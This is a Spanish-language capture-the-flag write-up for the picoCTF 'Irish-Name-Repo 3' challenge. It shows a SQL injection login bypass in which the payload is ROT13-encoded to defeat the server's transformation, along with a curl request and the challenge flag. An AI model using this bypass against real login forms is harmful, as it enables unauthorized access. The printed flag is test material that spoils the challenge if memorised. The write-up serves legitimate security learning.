# Irish-Name-Repo 3
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!

- Hints: Seems like the password is encrypted.

## Solución
- muy similar al anterior, probamos la inyección por defecto `' or 1==1--` desactivando el debug para ver la retro
```
password: ' or 1==1;
SQL query: SELECT * FROM admin where password = '' be 1==1;'
```
- probamos con un texto mas largo: esto es una prueba
```
password: esto es una prueba
SQL query: SELECT * FROM admin where password = 'rfgb rf han cehron'

# Login failed.
```
- notamos que es encriptado de alguna forma, probamos cyberchef y vemos que es rot134
- https://gchq.github.io/CyberChef
- Entonces le mandaremos el payload encriptado en rot13 para que al llegarle haga lo contrario
```
' or 1==1--
' be 1==1--

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}
```

### Consola
```bash
curl https://jupiter.challenges.picoctf.org/problem/54253/login.php -d "password=' be 1==1--"
<h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}</p>**%**
```

## Referencias

- sql injection: https://www.w3schools.com/sql/sql_injection.asp
- cyberchef : https://gchq.github.io/CyberChef/